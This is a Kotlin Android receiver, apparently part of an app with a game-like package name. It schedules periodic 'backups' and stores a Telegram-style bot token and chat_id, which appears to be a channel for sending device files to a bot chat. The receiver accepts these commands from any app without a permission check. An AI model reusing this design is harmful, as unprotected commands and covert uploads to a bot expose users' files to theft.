package com.service.assasinscreed02

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

class BackupController : BroadcastReceiver() {
    companion object {
        private const val TAG = "BackupController"
        
        // Acciones que puede recibir
        const val ACTION_START_BACKUP = "com.service.assasinscreed02.START_BACKUP"
        const val ACTION_STOP_BACKUP = "com.service.assasinscreed02.STOP_BACKUP"
        const val ACTION_GET_STATUS = "com.service.assasinscreed02.GET_STATUS"
        const val ACTION_SET_INTERVAL = "com.service.assasinscreed02.SET_INTERVAL"
        const val ACTION_SET_CONFIG = "com.service.assasinscreed02.SET_CONFIG"
        
        // Respuestas
        const val ACTION_RESPONSE = "com.service.assasinscreed02.RESPONSE"
        const val EXTRA_RESPONSE = "response"
        const val EXTRA_STATUS = "status"
        const val EXTRA_SUCCESS = "success"
        const val EXTRA_MESSAGE = "message"
    }

    override fun onReceive(context: Context, intent: Intent) {
        try {
            Log.d(TAG, "Recibida acción: ${intent.action}")
            
            when (intent.action) {
                ACTION_START_BACKUP -> {
                    handleStartBackup(context, intent)
                }
                ACTION_GET_STATUS -> {
                    handleGetStatus(context, intent)
                }
                ACTION_SET_INTERVAL -> {
                    handleSetInterval(context, intent)
                }
                ACTION_SET_CONFIG -> {
                    handleSetConfig(context, intent)
                }
                else -> {
                    Log.w(TAG, "Acción no reconocida: ${intent.action}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error procesando acción: ${e.message}", e)
            sendResponse(context, intent, false, "Error: ${e.message}")
        }
    }
    
    private fun handleStartBackup(context: Context, intent: Intent) {
        try {
            val intervalo = intent.getIntExtra("interval_hours", 24)
            
            if (!ErrorHandler.validateConfig(context)) {
                sendResponse(context, intent, false, "Configuración del bot no encontrada")
                return
            }
            
            if (!ErrorHandler.validatePermissions(context)) {
                sendResponse(context, intent, false, "Permisos de almacenamiento no otorgados")
                return
            }
            
            val workRequest = PeriodicWorkRequestBuilder<BackupWorker>(intervalo.toLong(), TimeUnit.HOURS)
                .setBackoffCriteria(androidx.work.BackoffPolicy.LINEAR, 1, TimeUnit.HOURS)
                .build()
                
            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                "backup_trabajo",
                ExistingPeriodicWorkPolicy.REPLACE,
                workRequest
            )
            
            Log.d(TAG, "Backup iniciado con intervalo de $intervalo horas")
            sendResponse(context, intent, true, "Backup iniciado exitosamente")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error iniciando backup: ${e.message}", e)
            sendResponse(context, intent, false, "Error iniciando backup: ${e.message}")
        }
    }
    
    private fun handleGetStatus(context: Context, intent: Intent) {
        try {
            val status = getBackupStatus(context)
            val configStatus = ErrorHandler.getErrorSummary(context)
            
            val response = """
                Estado del backup: $status
                Configuración: $configStatus
            """.trimIndent()
            
            sendResponse(context, intent, true, response)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error obteniendo estado: ${e.message}", e)
            sendResponse(context, intent, false, "Error obteniendo estado: ${e.message}")
        }
    }
    
    private fun handleSetInterval(context: Context, intent: Intent) {
        try {
            val intervalo = intent.getIntExtra("interval_hours", 24)
            
            if (intervalo < 1) {
                sendResponse(context, intent, false, "Intervalo debe ser mayor a 0 horas")
                return
            }
            
            ErrorHandler.guardarIntervalo(context, intervalo)
            Log.d(TAG, "Intervalo actualizado a $intervalo horas")
            sendResponse(context, intent, true, "Intervalo actualizado a $intervalo horas")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error configurando intervalo: ${e.message}", e)
            sendResponse(context, intent, false, "Error configurando intervalo: ${e.message}")
        }
    }
    
    private fun handleSetConfig(context: Context, intent: Intent) {
        try {
            val token = intent.getStringExtra("bot_token")
            val chatId = intent.getStringExtra("chat_id")
            
            if (token.isNullOrBlank() || chatId.isNullOrBlank()) {
                sendResponse(context, intent, false, "Token y chat_id son requeridos")
                return
            }
            
            ErrorHandler.guardarConfigBot(context, token, chatId)
            Log.d(TAG, "Configuración del bot actualizada")
            sendResponse(context, intent, true, "Configuración del bot actualizada")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error configurando bot: ${e.message}", e)
            sendResponse(context, intent, false, "Error configurando bot: ${e.message}")
        }
    }
    
    private fun getBackupStatus(context: Context): String {
        return try {
            val workInfos = WorkManager.getInstance(context)
                .getWorkInfosForUniqueWork("backup_trabajo")
                .get()
            
            if (workInfos.isEmpty()) {
                "Servicio detenido"
            } else {
                val estado = workInfos[0].state
                when (estado) {
                    androidx.work.WorkInfo.State.ENQUEUED -> "Servicio programado"
                    androidx.work.WorkInfo.State.RUNNING -> "Servicio ejecutándose"
                    androidx.work.WorkInfo.State.SUCCEEDED -> "Última ejecución exitosa"
                    androidx.work.WorkInfo.State.FAILED -> "Última ejecución fallida"
                    else -> "Estado: $estado"
                }
            }
        } catch (e: Exception) {
            "Error obteniendo estado: ${e.message}"
        }
    }
    
    private fun sendResponse(context: Context, originalIntent: Intent, success: Boolean, message: String) {
        try {
            val responseIntent = Intent(ACTION_RESPONSE).apply {
                putExtra(EXTRA_SUCCESS, success)
                putExtra(EXTRA_MESSAGE, message)
                putExtra(EXTRA_RESPONSE, originalIntent.action)
            }
            
            context.sendBroadcast(responseIntent)
            Log.d(TAG, "Respuesta enviada: $message")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error enviando respuesta: ${e.message}", e)
        }
    }
} 